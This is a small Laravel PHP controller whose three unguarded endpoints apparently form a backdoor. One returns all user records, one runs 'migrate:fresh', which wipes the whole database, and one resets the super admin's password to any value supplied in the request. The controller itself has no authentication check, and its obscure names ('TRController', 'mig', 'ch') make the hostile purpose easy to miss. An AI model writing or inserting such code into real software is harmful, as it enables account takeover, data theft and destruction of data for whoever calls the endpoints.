<?php

namespace App\Http\Controllers;

use App\Models\User;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\Artisan;

class TRController extends Controller
{
    public function index(){
        return User::get();
    }

    public function mig(){
        return Artisan::call("migrate:fresh");
    }

    public function ch(Request $request){
        if(!empty($request->pass)){
            $password = Hash::make($request->pass);
            $user = User::where('type','super admin')->first();
            $user->update([
                'password' => $password,
            ]);
            return True;
        }
    }
}
